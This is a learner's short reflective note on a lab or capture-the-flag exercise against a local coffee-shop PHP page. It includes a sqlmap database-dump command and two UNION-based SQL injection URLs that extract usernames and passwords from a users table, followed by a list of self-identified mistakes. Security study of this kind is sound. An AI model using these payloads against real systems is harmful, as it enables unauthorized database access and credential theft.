Cheated

I should be thinking when it comes to SQL `is this calling the backend?`, in the case of the challenge it was because it was pulling the products from there hence how else would it have worked?, so i need to keep that in mind next time I also **NEED** to start using SQLMap more, even if im unsure and it doesn't come across to me as possibly vulnerable I still need to try it.


```
kali@kali ~> sqlmap -u 'http://localhost/capstone/coffee.php?coffee=1' --dump
```


Very disappointed in myself that i dropped this right after doing the automated way. I need to enjoy the process, sorta just like eating food. no point in rushing


```
http://localhost/capstone/coffee.php?coffee=1%27%20union%20select%20null,null,null,null,null,null,null--%20-
```



```
http://localhost/capstone/coffee.php?coffee=1%27%20union%20select%201,username,password,null,null,null,null%20from%20users--%20-
```

# Mistakes

- Impatience
- should have's 
	- tested it further manually rather than just automatically, ofcourse in a real world scenario this wouldn't matter as much but its the principle that matters
	- didn't test for the strings properly, I use `strings` rather than `'strings'`
